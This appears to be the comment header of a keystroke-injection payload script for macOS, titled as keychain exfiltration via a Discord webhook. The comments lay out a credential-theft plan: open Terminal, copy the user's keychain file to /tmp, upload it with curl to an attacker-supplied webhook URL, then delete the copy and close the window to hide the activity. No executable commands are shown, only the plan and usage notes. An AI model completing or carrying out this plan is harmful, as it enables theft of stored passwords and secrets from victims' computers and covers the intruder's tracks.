REM MAC KEYCHAIN EXFILTRATION VIA DISCORD WEBHOOK
REM ECTO-1A

REM This script assumes that you have the "curl" command installed on your Mac. 
REM You will need to replace <webhook URL> with the URL of the Discord webhook you want to use.
REM Discord max webook file size is 8mb so this will only work with smaller files


REM This script will open the terminal, navigate to the directory where the keychain file is stored, 
REM copy the file to the tmp directory, use curl to send the file to the Discord webhook, 
REM delete the copy of the file from the tmp directory, and then close the terminal.
